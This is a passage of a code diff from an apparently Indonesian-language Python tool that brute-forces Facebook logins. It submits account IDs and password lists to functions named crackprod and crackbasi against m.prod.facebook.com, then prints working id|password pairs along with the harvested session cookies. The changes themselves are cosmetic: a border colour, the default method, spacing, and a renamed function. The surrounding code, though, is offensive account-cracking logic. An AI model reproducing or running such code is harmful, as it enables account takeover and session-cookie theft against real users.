@@ -322,7 +322,7 @@ def logoku():
         logo_text,
         title="[bold magenta]Selamat Datang[/bold magenta]",  # Warna judul magenta
         subtitle="[bold yellow]Gunakan Setelah Registrasi Tools Anda[/bold yellow]",  # Subjudul warna kuning
-        border_style="bright_blue",  # Warna border biru cerah
+        border_style=f"{color_panel}",  # Warna border biru cerah
         width=60
     )
 
@@ -1065,7 +1065,7 @@ def setting():
     elif hc in ["4", "04"]:
         method.append("mbasic")
     else:
-        method.append("validatev1")
+        method.append("reguler")
     Console().print(Panel(f"[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T",title=f"[bold green]Setting User-Agent",width=60,style=f"{color_panel}"))
     uatambah = console.input(f" {H2}• {P2}Masukan : ")
     if uatambah in ["y", "Ya", "ya", "Y"]:
@@ -1179,15 +1179,15 @@ def metslow():
                 else:
                     pass
                 if "validatev1" in method:
-                    pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
+                    pool.submit(vipernew,idf,pwv,'m.prod.facebook.com')
                 elif "validatev2" in method:
-                    pool.submit(crackprod, idf, pwv)
+                    pool.submit(crackprod,idf,pwv)
                 elif "reguler" in method:
-                    pool.submit(reguler, idf, pwv)
+                    pool.submit(reguler,idf,pwv)
                 elif "mbasic" in method:
-                    pool.submit(crackbasi, idf, pwv)
+                    pool.submit(crackbasi,idf,pwv)
                 else:
-                    pool.submit(reguler, idf, pwv)
+                    pool.submit(reguler,idf,pwv)
     print("")
     Console().print(
         Panel(
@@ -1246,15 +1246,15 @@ def metcepat():
                         pwv.append(xpwd)
                 else:pass
                 if "validatev1" in method:
-                    pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
+                    pool.submit(vipernew,idf,pwv,'m.prod.facebook.com')
                 elif "validatev2" in method:
-                    pool.submit(crackprod, idf, pwv)
+                    pool.submit(crackprod,idf,pwv)
                 elif "reguler" in method:
-                    pool.submit(reguler, idf, pwv)
+                    pool.submit(reguler,idf,pwv)
                 elif "mbasic" in method:
-                    pool.submit(crackbasi, idf, pwv)
+                    pool.submit(crackbasi,idf,pwv)
                 else:
-                    pool.submit(reguler, idf, pwv)
+                    pool.submit(reguler,idf,pwv)
     print("")
     Console().print(
         Panel(
@@ -1333,7 +1333,7 @@ def vipernew(idf,pwv,url):
             if "checkpoint" in ses.cookies.get_dict().keys():
                 cp += 1
                 tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
-                tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
                 prints(tree)
                 os.popen("play-audio c.mp3")
@@ -1344,7 +1344,7 @@ def vipernew(idf,pwv,url):
                 ok += 1
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
-                tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                 tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
                 prints(tree)
                 os.popen("play-audio o.mp3")
